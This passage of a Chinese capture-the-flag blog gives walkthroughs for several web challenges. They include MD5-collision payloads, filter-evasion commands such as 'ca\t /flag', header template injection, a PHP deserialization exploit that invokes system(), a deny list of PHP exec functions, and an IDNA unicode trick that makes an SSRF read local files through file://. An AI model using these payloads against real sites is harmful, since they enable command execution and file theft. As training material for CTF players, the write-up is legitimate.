class="hljs-symbol">%D5</span><span class="hljs-symbol">%5</span>D<span class="hljs-symbol">%83</span><span class="hljs-symbol">%60</span><span class="hljs-symbol">%FB_</span><span class="hljs-symbol">%07</span><span class="hljs-symbol">%FE</span><span class="hljs-symbol">%A2</span></code></pre></div>

<p><code>if (!is_numeric($passwd))</code>弱类型比较，使用1234567a绕过</p>
<p>payload:</p>
<div class="hljs"><pre><code class="hljs xquery"><span class="hljs-built_in">?id</span>=M<span class="hljs-meta">%C9h</span><span class="hljs-meta">%FF</span><span class="hljs-meta">%0E</span><span class="hljs-meta">%E3</span><span class="hljs-meta">%5C</span><span class="hljs-meta">%20</span><span class="hljs-meta">%95r</span><span class="hljs-meta">%D4w</span><span class="hljs-meta">%7Br</span><span class="hljs-meta">%15</span><span class="hljs-meta">%87</span><span class="hljs-meta">%D3o</span><span class="hljs-meta">%A7</span><span class="hljs-meta">%B2</span><span class="hljs-meta">%1B</span><span class="hljs-meta">%DCV</span><span class="hljs-meta">%B7J</span><span class="hljs-meta">%3D</span><span class="hljs-meta">%C0x</span><span class="hljs-meta">%3E</span><span class="hljs-meta">%7B</span><span class="hljs-meta">%95</span><span class="hljs-meta">%18</span><span class="hljs-meta">%AF</span><span class="hljs-meta">%BF</span><span class="hljs-meta">%A2</span><span class="hljs-meta">%00</span><span class="hljs-meta">%A8</span><span class="hljs-meta">%28K</span><span class="hljs-meta">%F3n</span><span class="hljs-meta">%8EKU</span><span class="hljs-meta">%B3_Bu</span><span class="hljs-meta">%93</span><span class="hljs-meta">%D8Igm</span><span class="hljs-meta">%A0</span><span class="hljs-meta">%D1U</span><span class="hljs-meta">%5D</span><span class="hljs-meta">%83</span><span class="hljs-meta">%60</span><span class="hljs-meta">%FB_</span><span class="hljs-meta">%07</span><span class="hljs-meta">%FE</span><span class="hljs-meta">%A2</span>&amp;gg=M<span class="hljs-meta">%C9h</span><span class="hljs-meta">%FF</span><span class="hljs-meta">%0E</span><span class="hljs-meta">%E3</span><span class="hljs-meta">%5C</span><span class="hljs-meta">%20</span><span class="hljs-meta">%95r</span><span class="hljs-meta">%D4w</span><span class="hljs-meta">%7Br</span><span class="hljs-meta">%15</span><span class="hljs-meta">%87</span><span class="hljs-meta">%D3o</span><span class="hljs-meta">%A7</span><span class="hljs-meta">%B2</span><span class="hljs-meta">%1B</span><span class="hljs-meta">%DCV</span><span class="hljs-meta">%B7J</span><span class="hljs-meta">%3D</span><span class="hljs-meta">%C0x</span><span class="hljs-meta">%3E</span><span class="hljs-meta">%7B</span><span class="hljs-meta">%95</span><span class="hljs-meta">%18</span><span class="hljs-meta">%AF</span><span class="hljs-meta">%BF</span><span class="hljs-meta">%A2</span><span class="hljs-meta">%02</span><span class="hljs-meta">%A8</span><span class="hljs-meta">%28K</span><span class="hljs-meta">%F3n</span><span class="hljs-meta">%8EKU</span><span class="hljs-meta">%B3_Bu</span><span class="hljs-meta">%93</span><span class="hljs-meta">%D8Igm</span><span class="hljs-meta">%A0</span><span class="hljs-meta">%D1</span><span class="hljs-meta">%D5</span><span class="hljs-meta">%5D</span><span class="hljs-meta">%83</span><span class="hljs-meta">%60</span><span class="hljs-meta">%FB_</span><span class="hljs-meta">%07</span><span class="hljs-meta">%FE</span><span class="hljs-meta">%A2</span>

POST:passwd=<span class="hljs-number">1234567</span>a

或者
<span class="hljs-built_in">?id</span>[]=<span class="hljs-number">1</span>&amp;gg[]=<span class="hljs-number">2</span>

POST:passwd=<span class="hljs-number">1234567</span>a</code></pre></div>

<h2 id="安洵杯-2019-easy-web"><a href="#安洵杯-2019-easy-web" class="headerlink" title="[安洵杯 2019]easy_web"></a>[安洵杯 2019]easy_web</h2><p>url中包含<code>/index.php?img=TXpVek5UTTFNbVUzTURabE5qYz0&amp;cmd=</code>，仔细看<code>TXpVek5UTTFNbVUzTURabE5qYz0</code>其实是base64编码，解码还是base64，继续解码为一串十六进制的字符，内容为555.png</p>
<p>通过<code>555.png--&gt;TXpVek5UTTFNbVUzTURabE5qYz0</code>可以类型的构造出index.php查询代码</p>
<div class="hljs"><pre><code class="hljs angelscript">index.php

<span class="hljs-number">696e6465782</span>e706870

Njk2ZTY0NjU3ODJlNzA2ODcw

TmprMlpUWTBOalUzT0RKbE56QTJPRGN3</code></pre></div>





<p><img src="https://i.loli.net/2020/10/24/ZfMW62Ik1L5adpz.png" srcset="/img/loading.gif" alt="web-1.png"></p>
<p>base64解码后</p>
<p><img src="https://i.loli.net/2021/01/08/x3jpitoCluR6TEg.png" srcset="/img/loading.gif" alt="image-20210108204318609"></p>
<p>这题还对一些系统命令进行了过滤，这里需要想办法绕过</p>
<p>ls，不可以使用，但是dir没有过滤，可以使用<code>dir%20/</code>读取目录</p>
<p>cat被过滤了，但是可以使用<code>ca\t</code>绕过，<code>ca\t%20/flag</code></p>
<p><strong>(linux命令中可以加)</strong></p>
<div class="hljs"><pre><code class="hljs lisp">if ((<span class="hljs-name">string</span>)$_POST['a'] !== (<span class="hljs-name">string</span>)$_POST['b'] <span class="hljs-symbol">&amp;&amp;</span> md5($_POST['a']) === md5($_POST['b']))</code></pre></div>

<p>md5强碰撞的字符串</p>
<div class="hljs"><pre><code class="hljs llvm">a=<span class="hljs-symbol">%4</span>d<span class="hljs-symbol">%c9</span><span class="hljs-symbol">%68</span><span class="hljs-symbol">%ff</span><span class="hljs-symbol">%0</span>e<span class="hljs-symbol">%e3</span><span class="hljs-symbol">%5</span><span class="hljs-keyword">c</span><span class="hljs-symbol">%20</span><span class="hljs-symbol">%95</span><span class="hljs-symbol">%72</span><span class="hljs-symbol">%d4</span><span class="hljs-symbol">%77</span><span class="hljs-symbol">%7</span>b<span class="hljs-symbol">%72</span><span class="hljs-symbol">%15</span><span class="hljs-symbol">%87</span><span class="hljs-symbol">%d3</span><span class="hljs-symbol">%6</span>f<span class="hljs-symbol">%a7</span><span class="hljs-symbol">%b2</span><span class="hljs-symbol">%1</span>b<span class="hljs-symbol">%dc</span><span class="hljs-symbol">%56</span><span class="hljs-symbol">%b7</span><span class="hljs-symbol">%4</span>a<span class="hljs-symbol">%3</span>d<span class="hljs-symbol">%c0</span><span class="hljs-symbol">%78</span><span class="hljs-symbol">%3</span>e<span class="hljs-symbol">%7</span>b<span class="hljs-symbol">%95</span><span class="hljs-symbol">%18</span><span class="hljs-symbol">%af</span><span class="hljs-symbol">%bf</span><span class="hljs-symbol">%a2</span><span class="hljs-symbol">%00</span><span class="hljs-symbol">%a8</span><span class="hljs-symbol">%28</span><span class="hljs-symbol">%4</span>b<span class="hljs-symbol">%f3</span><span class="hljs-symbol">%6</span>e<span class="hljs-symbol">%8</span>e<span class="hljs-symbol">%4</span>b<span class="hljs-symbol">%55</span><span class="hljs-symbol">%b3</span><span class="hljs-symbol">%5</span>f<span class="hljs-symbol">%42</span><span class="hljs-symbol">%75</span><span class="hljs-symbol">%93</span><span class="hljs-symbol">%d8</span><span class="hljs-symbol">%49</span><span class="hljs-symbol">%67</span><span class="hljs-symbol">%6</span>d<span class="hljs-symbol">%a0</span><span class="hljs-symbol">%d1</span><span class="hljs-symbol">%55</span><span class="hljs-symbol">%5</span>d<span class="hljs-symbol">%83</span><span class="hljs-symbol">%60</span><span class="hljs-symbol">%fb</span><span class="hljs-symbol">%5</span>f<span class="hljs-symbol">%07</span><span class="hljs-symbol">%fe</span><span class="hljs-symbol">%a2</span>
&amp;b=<span class="hljs-symbol">%4</span>d<span class="hljs-symbol">%c9</span><span class="hljs-symbol">%68</span><span class="hljs-symbol">%ff</span><span class="hljs-symbol">%0</span>e<span class="hljs-symbol">%e3</span><span class="hljs-symbol">%5</span><span class="hljs-keyword">c</span><span class="hljs-symbol">%20</span><span class="hljs-symbol">%95</span><span class="hljs-symbol">%72</span><span class="hljs-symbol">%d4</span><span class="hljs-symbol">%77</span><span class="hljs-symbol">%7</span>b<span class="hljs-symbol">%72</span><span class="hljs-symbol">%15</span><span class="hljs-symbol">%87</span><span class="hljs-symbol">%d3</span><span class="hljs-symbol">%6</span>f<span class="hljs-symbol">%a7</span><span class="hljs-symbol">%b2</span><span class="hljs-symbol">%1</span>b<span class="hljs-symbol">%dc</span><span class="hljs-symbol">%56</span><span class="hljs-symbol">%b7</span><span class="hljs-symbol">%4</span>a<span class="hljs-symbol">%3</span>d<span class="hljs-symbol">%c0</span><span class="hljs-symbol">%78</span><span class="hljs-symbol">%3</span>e<span class="hljs-symbol">%7</span>b<span class="hljs-symbol">%95</span><span class="hljs-symbol">%18</span><span class="hljs-symbol">%af</span><span class="hljs-symbol">%bf</span><span class="hljs-symbol">%a2</span><span class="hljs-symbol">%02</span><span class="hljs-symbol">%a8</span><span class="hljs-symbol">%28</span><span class="hljs-symbol">%4</span>b<span class="hljs-symbol">%f3</span><span class="hljs-symbol">%6</span>e<span class="hljs-symbol">%8</span>e<span class="hljs-symbol">%4</span>b<span class="hljs-symbol">%55</span><span class="hljs-symbol">%b3</span><span class="hljs-symbol">%5</span>f<span class="hljs-symbol">%42</span><span class="hljs-symbol">%75</span><span class="hljs-symbol">%93</span><span class="hljs-symbol">%d8</span><span class="hljs-symbol">%49</span><span class="hljs-symbol">%67</span><span class="hljs-symbol">%6</span>d<span class="hljs-symbol">%a0</span><span class="hljs-symbol">%d1</span><span class="hljs-symbol">%d5</span><span class="hljs-symbol">%5</span>d<span class="hljs-symbol">%83</span><span class="hljs-symbol">%60</span><span class="hljs-symbol">%fb</span><span class="hljs-symbol">%5</span>f<span class="hljs-symbol">%07</span><span class="hljs-symbol">%fe</span><span class="hljs-symbol">%a2</span></code></pre></div>

<p>直接查看目录 <code>dir /</code></p>
<p>获取flag</p>
<div class="hljs"><pre><code class="hljs angelscript">ca\t%<span class="hljs-number">20</span>/flag</code></pre></div>

<p><img src="https://i.loli.net/2020/10/24/lfOzTIEwbBJDaMx.png" srcset="/img/loading.gif" alt="web-3.png"></p>
<h2 id="BJDCTF2020-Mark-loves-cat"><a href="#BJDCTF2020-Mark-loves-cat" class="headerlink" title="[BJDCTF2020]Mark loves cat"></a>[BJDCTF2020]Mark loves cat</h2><p>变量覆盖</p>
<p><img src="https://i.loli.net/2021/01/08/yBrChYxGJt6w81c.png" srcset="/img/loading.gif" alt="image-20210108204543551"></p>
<p>poyload:</p>
<div class="hljs"><pre><code class="hljs routeros">?<span class="hljs-attribute">yds</span>=flag
POST: <span class="hljs-variable">$flag</span>=flag</code></pre></div>

<h2 id="BJDCTF2020-The-mystery-of-ip"><a href="#BJDCTF2020-The-mystery-of-ip" class="headerlink" title="[BJDCTF2020]The mystery of ip"></a>[BJDCTF2020]The mystery of ip</h2><p>进入页面不知道干啥，随便点点，到flag.php时显示了IP地址</p>
<p>查看原码发现提示<code>&lt;!-- Do you know why i know your ip? --&gt;</code></p>
<p>猜测这里是跟XFF有关，于是修改XFF:127.0.0.1，果然页面显示的就是IP是127.0.0.1</p>
<p>这里就想到了XFF注入，是否可以类似于XFF注入，将系统名令注入进去</p>
<p>首先试试<code>system(&quot;ls /&quot;)</code>,但是发现没有被执行，于是家上括号<code>{system(&quot;ls /&quot;)}</code>，这次执行成功</p>
<p><img src="https://i.loli.net/2020/10/24/EGtFP2INmuhgroY.png" srcset="/img/loading.gif" alt="ip-1.png"></p>
<p>最后获取flag, <code>{system(cat /flag)}</code></p>
<h2 id="网鼎杯-2020-朱雀组-phpweb"><a href="#网鼎杯-2020-朱雀组-phpweb" class="headerlink" title="[网鼎杯 2020 朱雀组]phpweb"></a>[网鼎杯 2020 朱雀组]phpweb</h2><div class="hljs"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
    $disable_fun = <span class="hljs-keyword">array</span>(<span class="hljs-string">"exec"</span>,<span class="hljs-string">"shell_exec"</span>,<span class="hljs-string">"system"</span>,<span class="hljs-string">"passthru"</span>,<span class="hljs-string">"proc_open"</span>,<span class="hljs-string">"show_source"</span>,<span class="hljs-string">"phpinfo"</span>,<span class="hljs-string">"popen"</span>,<span class="hljs-string">"dl"</span>,<span class="hljs-string">"eval"</span>,<span class="hljs-string">"proc_terminate"</span>,<span class="hljs-string">"touch"</span>,<span class="hljs-string">"escapeshellcmd"</span>,<span class="hljs-string">"escapeshellarg"</span>,<span class="hljs-string">"assert"</span>,<span class="hljs-string">"substr_replace"</span>,<span class="hljs-string">"call_user_func_array"</span>,<span class="hljs-string">"call_user_func"</span>,<span class="hljs-string">"array_filter"</span>, <span class="hljs-string">"array_walk"</span>,  <span class="hljs-string">"array_map"</span>,<span class="hljs-string">"registregister_shutdown_function"</span>,<span class="hljs-string">"register_tick_function"</span>,<span class="hljs-string">"filter_var"</span>, <span class="hljs-string">"filter_var_array"</span>, <span class="hljs-string">"uasort"</span>, <span class="hljs-string">"uksort"</span>, <span class="hljs-string">"array_reduce"</span>,<span class="hljs-string">"array_walk"</span>, <span class="hljs-string">"array_walk_recursive"</span>,<span class="hljs-string">"pcntl_exec"</span>,<span class="hljs-string">"fopen"</span>,<span class="hljs-string">"fwrite"</span>,<span class="hljs-string">"file_put_contents"</span>);
    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">gettime</span><span class="hljs-params">($func, $p)</span> </span>&#123;
        $result = call_user_func($func, $p);
        $a= gettype($result);
        <span class="hljs-keyword">if</span> ($a == <span class="hljs-string">"string"</span>) &#123;
            <span class="hljs-keyword">return</span> $result;
        &#125; <span class="hljs-keyword">else</span> &#123;<span class="hljs-keyword">return</span> <span class="hljs-string">""</span>;&#125;
    &#125;
    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Test</span> </span>&#123;
        <span class="hljs-keyword">var</span> $p = <span class="hljs-string">"Y-m-d h:i:s a"</span>;
        <span class="hljs-keyword">var</span> $func = <span class="hljs-string">"date"</span>;
        <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span><span class="hljs-params">()</span> </span>&#123;
            <span class="hljs-keyword">if</span> (<span class="hljs-keyword">$this</span>-&gt;func != <span class="hljs-string">""</span>) &#123;
                <span class="hljs-keyword">echo</span> gettime(<span class="hljs-keyword">$this</span>-&gt;func, <span class="hljs-keyword">$this</span>-&gt;p);
            &#125;
        &#125;
    &#125;
    $func = $_REQUEST[<span class="hljs-string">"func"</span>];
    $p = $_REQUEST[<span class="hljs-string">"p"</span>];

    <span class="hljs-keyword">if</span> ($func != <span class="hljs-keyword">null</span>) &#123;
        $func = strtolower($func);
        <span class="hljs-keyword">if</span> (!in_array($func,$disable_fun)) &#123;
            <span class="hljs-keyword">echo</span> gettime($func, $p);
        &#125;<span class="hljs-keyword">else</span> &#123;
            <span class="hljs-keyword">die</span>(<span class="hljs-string">"Hacker..."</span>);
        &#125;
    &#125;
    <span class="hljs-meta">?&gt;</span></code></pre></div>

<p>exp</p>
<div class="hljs"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Test</span> </span>&#123;
        <span class="hljs-keyword">var</span> $p = <span class="hljs-string">"Y-m-d h:i:s a"</span>;
        <span class="hljs-keyword">var</span> $func = <span class="hljs-string">"date"</span>;
        <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span><span class="hljs-params">()</span> </span>&#123;
            <span class="hljs-keyword">if</span> (<span class="hljs-keyword">$this</span>-&gt;func != <span class="hljs-string">""</span>) &#123;
                <span class="hljs-keyword">echo</span> gettime(<span class="hljs-keyword">$this</span>-&gt;func, <span class="hljs-keyword">$this</span>-&gt;p);
            &#125;
        &#125;
    &#125;
$a = <span class="hljs-keyword">new</span> Test();
$a-&gt;p=<span class="hljs-string">"cat /tmp/flagoefiu4r93"</span>;
$a-&gt;func=<span class="hljs-string">"system"</span>;
<span class="hljs-keyword">print</span>(urlencode(serialize($a)));

<span class="hljs-meta">?&gt;</span></code></pre></div>

<h2 id="De1CTF-2019-SSRF-Me"><a href="#De1CTF-2019-SSRF-Me" class="headerlink" title="[De1CTF 2019]SSRF Me"></a>[De1CTF 2019]SSRF Me</h2><div class="hljs"><pre><code class="hljs python"><span class="hljs-comment">#! /usr/bin/env python</span>
<span class="hljs-comment">#encoding=utf-8</span>
<span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> Flask
<span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> request
<span class="hljs-keyword">import</span> socket
<span class="hljs-keyword">import</span> hashlib
<span class="hljs-keyword">import</span> urllib
<span class="hljs-keyword">import</span> sys
<span class="hljs-keyword">import</span> os
<span class="hljs-keyword">import</span> json
reload(sys)
sys.setdefaultencoding(<span class="hljs-string">'latin1'</span>)

app = Flask(__name__)

secert_key = os.urandom(<span class="hljs-number">16</span>)

<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Task</span>:</span>
    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__init__</span><span class="hljs-params">(self, action, param, sign, ip)</span>:</span>
        self.action = action
        self.param = param
        self.sign = sign
        self.sandbox = md5(ip)
        <span class="hljs-keyword">if</span>(<span class="hljs-keyword">not</span> os.path.exists(self.sandbox)): <span class="hljs-comment">#SandBox For Remote_Addr</span>
            os.mkdir(self.sandbox)

    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">Exec</span><span class="hljs-params">(self)</span>:</span>
        result = &#123;&#125;
        result[<span class="hljs-string">'code'</span>] = <span class="hljs-number">500</span>
        <span class="hljs-keyword">if</span> (self.checkSign()):
            <span class="hljs-keyword">if</span> <span class="hljs-string">"scan"</span> <span class="hljs-keyword">in</span> self.action:
                tmpfile = open(<span class="hljs-string">"./%s/result.txt"</span> % self.sandbox, <span class="hljs-string">'w'</span>)
                resp = scan(self.param)
                <span class="hljs-keyword">if</span> (resp == <span class="hljs-string">"Connection Timeout"</span>):
                    result[<span class="hljs-string">'data'</span>] = resp
                <span class="hljs-keyword">else</span>:
                    <span class="hljs-keyword">print</span> resp
                    tmpfile.write(resp)
                    tmpfile.close()
                result[<span class="hljs-string">'code'</span>] = <span class="hljs-number">200</span>
            <span class="hljs-keyword">if</span> <span class="hljs-string">"read"</span> <span class="hljs-keyword">in</span> self.action:
                f = open(<span class="hljs-string">"./%s/result.txt"</span> % self.sandbox, <span class="hljs-string">'r'</span>)
                result[<span class="hljs-string">'code'</span>] = <span class="hljs-number">200</span>
                result[<span class="hljs-string">'data'</span>] = f.read()
            <span class="hljs-keyword">if</span> result[<span class="hljs-string">'code'</span>] == <span class="hljs-number">500</span>:
                result[<span class="hljs-string">'data'</span>] = <span class="hljs-string">"Action Error"</span>
        <span class="hljs-keyword">else</span>:
            result[<span class="hljs-string">'code'</span>] = <span class="hljs-number">500</span>
            result[<span class="hljs-string">'msg'</span>] = <span class="hljs-string">"Sign Error"</span>
        <span class="hljs-keyword">return</span> result

    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">checkSign</span><span class="hljs-params">(self)</span>:</span>
        <span class="hljs-keyword">if</span> (getSign(self.action, self.param) == self.sign):
            <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span>
        <span class="hljs-keyword">else</span>:
            <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span>

<span class="hljs-comment">#generate Sign For Action Scan.</span>
<span class="hljs-meta">@app.route("/geneSign", methods=['GET', 'POST'])</span>
<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">geneSign</span><span class="hljs-params">()</span>:</span>
    param = urllib.unquote(request.args.get(<span class="hljs-string">"param"</span>, <span class="hljs-string">""</span>))
    action = <span class="hljs-string">"scan"</span>
    <span class="hljs-keyword">return</span> getSign(action, param)

<span class="hljs-meta">@app.route('/De1ta',methods=['GET','POST'])</span>
<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">challenge</span><span class="hljs-params">()</span>:</span>
    action = urllib.unquote(request.cookies.get(<span class="hljs-string">"action"</span>))
    param = urllib.unquote(request.args.get(<span class="hljs-string">"param"</span>, <span class="hljs-string">""</span>))
    sign = urllib.unquote(request.cookies.get(<span class="hljs-string">"sign"</span>))
    ip = request.remote_addr
    <span class="hljs-keyword">if</span>(waf(param)):
        <span class="hljs-keyword">return</span> <span class="hljs-string">"No Hacker!!!!"</span>
    task = Task(action, param, sign, ip)
    <span class="hljs-keyword">return</span> json.dumps(task.Exec())
<span class="hljs-meta">@app.route('/')</span>
<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">index</span><span class="hljs-params">()</span>:</span>
    <span class="hljs-keyword">return</span> open(<span class="hljs-string">"code.txt"</span>,<span class="hljs-string">"r"</span>).read()

<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">scan</span><span class="hljs-params">(param)</span>:</span>
    socket.setdefaulttimeout(<span class="hljs-number">1</span>)
    <span class="hljs-keyword">try</span>:
        <span class="hljs-keyword">return</span> urllib.urlopen(param).read()[:<span class="hljs-number">50</span>]
    <span class="hljs-keyword">except</span>:
        <span class="hljs-keyword">return</span> <span class="hljs-string">"Connection Timeout"</span>

<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">getSign</span><span class="hljs-params">(action, param)</span>:</span>
    <span class="hljs-keyword">return</span> hashlib.md5(secert_key + param + action).hexdigest()

<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">md5</span><span class="hljs-params">(content)</span>:</span>
    <span class="hljs-keyword">return</span> hashlib.md5(content).hexdigest()

<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">waf</span><span class="hljs-params">(param)</span>:</span>
    check=param.strip().lower()
    <span class="hljs-keyword">if</span> check.startswith(<span class="hljs-string">"gopher"</span>) <span class="hljs-keyword">or</span> check.startswith(<span class="hljs-string">"file"</span>):
        <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span>
    <span class="hljs-keyword">else</span>:
        <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span>

<span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">'__main__'</span>:
    app.debug = <span class="hljs-literal">False</span>
    app.run(host=<span class="hljs-string">'0.0.0.0'</span>,port=<span class="hljs-number">80</span>)</code></pre></div>



<h2 id="SUCTF-2019-Pythonginx"><a href="#SUCTF-2019-Pythonginx" class="headerlink" title="[SUCTF 2019]Pythonginx"></a>[SUCTF 2019]Pythonginx</h2><p>题目给出了源码</p>
<div class="hljs"><pre><code class="hljs python"><span class="hljs-meta">@app.route('/getUrl', methods=['GET', 'POST'])</span>
<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">getUrl</span><span class="hljs-params">()</span>:</span>
    url = request.args.get(<span class="hljs-string">"url"</span>)  <span class="hljs-comment"># 获取get提交的url参数</span>
    host = parse.urlparse(url).hostname <span class="hljs-comment">#获取url中的主机名</span>
    <span class="hljs-keyword">if</span> host == <span class="hljs-string">'suctf.cc'</span>:            
        <span class="hljs-keyword">return</span> <span class="hljs-string">"我扌 your problem? 111"</span>
    parts = list(urlsplit(url))       <span class="hljs-comment">#将url分隔开 协议类型 主机名 文件路径 存入列表 parts[1]为主机名</span>
    host = parts[<span class="hljs-number">1</span>]
    <span class="hljs-keyword">if</span> host == <span class="hljs-string">'suctf.cc'</span>:
        <span class="hljs-keyword">return</span> <span class="hljs-string">"我扌 your problem? 222 "</span> + host
    newhost = []
    <span class="hljs-keyword">for</span> h <span class="hljs-keyword">in</span> host.split(<span class="hljs-string">'.'</span>):
        newhost.append(h.encode(<span class="hljs-string">'idna'</span>).decode(<span class="hljs-string">'utf-8'</span>))   <span class="hljs-comment">#将主机名以.为分割 进行utf-8解码</span>
    parts[<span class="hljs-number">1</span>] = <span class="hljs-string">'.'</span>.join(newhost)         <span class="hljs-comment">#重新组成主机名</span>
    <span class="hljs-comment">#去掉 url 中的空格</span>
    finalUrl = urlunsplit(parts).split(<span class="hljs-string">' '</span>)[<span class="hljs-number">0</span>]
    host = parse.urlparse(finalUrl).hostname   <span class="hljs-comment"># 获取新的主机名   </span>
    <span class="hljs-keyword">if</span> host == <span class="hljs-string">'suctf.cc'</span>:
        <span class="hljs-keyword">return</span> urllib.request.urlopen(finalUrl).read()
    <span class="hljs-keyword">else</span>:
        <span class="hljs-keyword">return</span> <span class="hljs-string">"我扌 your problem? 333"</span>
   
    &lt;!-- Dont worry about the suctf.cc. Go on! --&gt;
    &lt;!-- Do you know the nginx? --&gt;</code></pre></div>



<p>考察点1：</p>
<blockquote>
<p>2019black hat一个议题</p>
<div class="hljs"><pre><code class="hljs awk">https:<span class="hljs-regexp">//i</span>.blackhat.com<span class="hljs-regexp">/USA-19/</span>Thursday<span class="hljs-regexp">/us-19-Birch-HostSplit-Exploitable-Antipatterns-In-Unicode-Normalization.pdf</span></code></pre></div>

<p>在unicode中字符℀(U+2100)，当IDNA处理此字符时，会将℀变成a/c，因此当你访问此url时，dns服务器会自动将url重定向到另一个网站。如果服务器引用前端url时，只对域名做了限制，那么通过这种方法，我们就可以轻松绕过服务器对域名的限制了。</p>
</blockquote>
<img src="https://i.loli.net/2020/10/29/5ixom8Hq7UYdRBV.png" srcset="/img/loading.gif" alt="utf-8.png" style="zoom:50%;">

<p>考察点2:</p>
<blockquote>
<p>Nginx服务器</p>
<p><a href="https://zhuanlan.zhihu.com/p/34943332，这篇文章介绍的很详细" target="_blank" rel="noopener">https://zhuanlan.zhihu.com/p/34943332，这篇文章介绍的很详细</a></p>
<p>这里只要知道nginx服务器的主要文件路径</p>
<p>配置文件存放目录：/etc/nginx </p>
<p>主配置文件：/etc/nginx/conf/nginx.conf </p>
<p>管理脚本：/usr/lib64/systemd/system/nginx.service </p>
<p>模块：/usr/lisb64/nginx/modules </p>
<p>应用程序：/usr/sbin/nginx </p>
<p>程序默认存放位置：/usr/share/nginx/html </p>
<p>日志默认存放位置：/var/log/nginx </p>
<p>配置文件目录为：/usr/local/nginx/conf/nginx.conf  //这题要用到的路径</p>
</blockquote>
<p>这里要读取的是文件，所以使用的file协议</p>
<p>直接够造</p>
<div class="hljs"><pre><code class="hljs vim"><span class="hljs-keyword">file</span>://suctf.<span class="hljs-keyword">cc</span>/usr/local/nginx/<span class="hljs-keyword">conf</span>/nginx.<span class="hljs-keyword">conf</span>
利用漏洞改为
<span class="hljs-keyword">file</span>://suctf.<span class="hljs-keyword">c</span>℆sr/local/nginx/<span class="hljs-keyword">conf</span>/nginx.<span class="hljs-keyword">conf</span></code></pre></div>

<p>给出flag路径</p>
<div class="hljs"><pre><code class="hljs crmsh">server &#123; listen <span class="hljs-number">80</span>; <span class="hljs-keyword">location</span> <span class="hljs-title">/ &#123; try_files</span> $uri @app; &#125; <span class="hljs-keyword">location</span> <span class="hljs-title">@app</span> &#123; include uwsgi_params; uwsgi_pass unix:///tmp/uwsgi.sock; &#125; <span class="hljs-keyword">location</span> <span class="hljs-title">/static</span> &#123; alias /app/static; &#125; <span class="hljs-comment"># location /flag &#123; # alias /usr/fffffflag; # &#125; &#125;</span>
 
构造
file://suctf.c℆sr/fffffflag

拿到flag</code></pre></div>

<p>为了直观感受url处理过程，写了脚本</p>
<div class="hljs"><pre><code class="hljs python"><span class="hljs-keyword">from</span> urllib <span class="hljs-keyword">import</span> parse
<span class="hljs-keyword">from</span> urllib.parse <span class="hljs-keyword">import</span> urlsplit, urlunsplit
url= <span class="hljs-string">"file://suctf.c℆sr/local/nginx/conf/nginx.conf"</span>
host = parse.urlparse(url).hostname
<span class="hljs-comment">#print(host)</span>
parts = list(urlsplit(url))
print(parts)
newhost=[]
<span class="hljs-keyword">for</span> h <span class="hljs-keyword">in</span> host.split(<span class="hljs-string">'.'</span>):
    newhost.append(h.encode(<span class="hljs-string">'idna'</span>).decode(<span class="hljs-string">'utf-8'</span>))
print(newhost)
parts[<span class="hljs-number">1</span>] = <span class="hljs-string">'.'</span>.join(newhost)
print(parts)
finalUrl = urlunsplit(parts).split(<span class="hljs-string">' '</span>)[<span class="hljs-number">0</span>]
print(finalUrl)</code></pre></div>

<p>结果</p>
<div class="hljs"><pre><code class="hljs vim">[<span class="hljs-string">'file'</span>, <span class="hljs-string">'suctf.c℆sr'</span>, <span class="hljs-string">'/local/nginx/conf/nginx.conf'</span>, <span class="hljs-string">''</span>, <span class="hljs-string">''</span>]
[<span class="hljs-string">'suctf'</span>, <span class="hljs-string">'cc/usr'</span>]
[<span class="hljs-string">'file'</span>, <span class="hljs-string">'suctf.cc/usr'</span>, <span class="hljs-string">'/local/nginx/conf/nginx.conf'</span>, <span class="hljs-string">''</span>, <span class="hljs-string">''</span>]
<span class="hljs-keyword">file</span>://suctf.<span class="hljs-keyword">cc</span>/usr/local/nginx/<span class="hljs-keyword">conf</span>/nginx.<span class="hljs-keyword">conf</span></code></pre></div>



<p>找出类似可用字符的脚本</p>
<div class="hljs"><pre><code class="hljs python"><span class="hljs-comment"># coding:utf-8</span>
<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">128</span>,<span class="hljs-number">65537</span>):
    tmp=chr(i)
    <span class="hljs-keyword">try</span>:
        res = tmp.encode(<span class="hljs-string">'idna'</span>).decode(<span class="hljs-string">'utf-8'</span>)
        <span class="hljs-keyword">if</span>(<span class="hljs-string">"-"</span>) <span class="hljs-keyword">in</span> res:
            <span class="hljs-keyword">continue</span>
        print(<span class="hljs-string">"U:&#123;&#125;    A:&#123;&#125;      ascii:&#123;&#125; "</span>.format(tmp, res, i))
    <span class="hljs-keyword">except</span>:
        <span class="hljs-keyword">pass</span></code></pre></div>

<hr>
<p>参考：</p>
<blockquote>
<p><a href="https://blog.csdn.net/qq_42181428/article/details/99741920" target="_blank" rel="noopener">https://blog.csdn.net/qq_42181428/article/details/99741920</a></p>
</blockquote>
